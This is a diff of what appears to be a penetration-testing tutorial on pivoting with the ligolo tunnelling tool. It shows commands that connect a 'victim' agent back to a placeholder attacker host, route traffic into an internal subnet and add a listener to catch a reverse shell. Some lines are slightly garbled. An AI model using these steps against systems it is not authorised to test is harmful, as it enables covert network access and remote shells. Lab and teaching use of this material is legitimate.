@@ -13,7 +13,7 @@ In order to leverage this tool you will need to download it via `git clone https
 You can then proceed to start, add and start the proxy server via these  commands.
 
 Attacker Machine:
-```
+```shell
 sudo ip tuntap add user kali mode tun ligolo
 sudo ip link set ligolo up
 chmod + proxy
@@ -21,7 +21,7 @@ chmod + proxy
 ```
 It is also worth noting that you can change the port it listens on, as by default it will listen on port 11601.
 
-```
+```shell
 ./proxy -selfcert -laddr 0.0.0.0:443
 ```
 
@@ -31,7 +31,7 @@ It is also worth noting that you can change the port it listens on, as by defaul
 Victim Machine (Windows or Linux):
 
 Upload the respective file. 
-```
+```shell
 ./agent -connect attackerip:port -ignore-cert
 ```
 The -ignore-cert will be required if you use -selfcert.
@@ -39,7 +39,7 @@ The -ignore-cert will be required if you use -selfcert.
 ![](/assets/images/ligolo/2.png)
 
 You must run a few more commands on the Attacker Machine from within the proxy prompt in order to get your tunnel running.
-```
+```shell
 session (session number)
 start
 ```
@@ -47,7 +47,7 @@ Once all of this is done you will be able to run commands from your attacker mac
 ![](/assets/images/ligolo/3.png)
 
 For this machine you must also run ```
-```
+```shell
 sudo ip route add 192.168.110.0/24 dev ligolo
 ```
 
@@ -60,7 +60,7 @@ It also worth noting that ligolo does not use SOCK5, but instead ligolo uses GVI
 You can also gain a revshell back to your client by adding a listener to your host.
 
 This must be done from the attacker machine.
-```
+```shell
 listener_add --addr 0.0.0.0:1234 --to 127.0.0.1:1234
 ```
 
